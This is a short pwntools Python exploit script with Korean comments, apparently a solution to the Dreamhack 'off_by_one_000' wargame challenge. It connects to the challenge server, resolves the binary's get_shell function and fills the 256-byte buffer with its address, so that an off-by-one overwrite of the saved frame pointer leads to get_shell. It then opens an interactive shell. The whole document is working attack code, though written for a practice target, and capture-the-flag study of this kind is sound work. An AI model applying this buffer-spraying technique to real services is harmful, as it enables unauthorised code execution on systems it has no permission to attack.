from pwn import *

# 1. 설정 (로컬 테스트 및 원격 접속)
# 로컬 바이너리가 있다면 './off_by_one_000' 경로 지정
# 없다면 다운로드 받아서 같은 폴더에 두세요.
filename = './off_by_one_000'
e = ELF(filename)

# 원격 서버 접속
p = remote('host8.dreamhack.games', 9017)

# 2. 공격 목표 주소 확보
get_shell = e.symbols['get_shell']
log.info(f"get_shell address: {hex(get_shell)}")

# 3. 페이로드 작성
# 전략: SFP의 하위 1바이트가 0x00으로 덮이면서 스택 포인터가 버퍼 안쪽으로 이동함.
# 정확한 오프셋을 맞추는 대신, 버퍼 전체를 get_shell 주소로 채우면(Spraying)
# 이동한 스택이 어디를 가리키든 get_shell이 실행됨.

# 256바이트를 get_shell 주소로 꽉 채움 (4바이트 * 64개 = 256바이트)
payload = p32(get_shell) * (256 // 4)

# 4. 페이로드 전송
p.sendafter(b"Name: ", payload)

# 5. 셸 획득 및 플래그 읽기
p.interactive()